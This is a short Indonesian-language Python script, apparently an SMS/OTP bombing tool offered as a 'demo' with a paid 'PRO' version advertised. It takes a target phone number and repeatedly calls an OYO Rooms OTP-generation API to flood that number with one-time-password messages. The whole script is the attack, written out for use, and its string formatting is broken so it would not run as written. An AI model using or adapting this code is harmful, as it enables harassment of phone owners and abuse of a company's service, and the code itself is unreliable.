import requests, os

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""
#Script Auto LAG by TuanTayo#
Author : TuanTayo
Email : cyber.tuantayo@gmail.com
Special Thanks To : All Members Hidden Group
"""%(c,r,g,r,g,r,g,r,g,r,w,r))
i=int(0)
no=input("Masukan Code Hack :"%(g,w))
while True:
	idk=('status')
	r=requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+no+'&country_code=+62')
	if str(idk) in str(r.text):
		print("[v] SUKSES Waiting...")
	else:
		print("[x] FAILED Waiting...")
		print("Terima Kasih Telah Menggunakan Script versi DEMO"%(r))
		break
	i+=1
	if i == 20:
		print("Mau Beli Script versi PRO? email : cyber.tuantayo@gmail.com"%(r))
		break

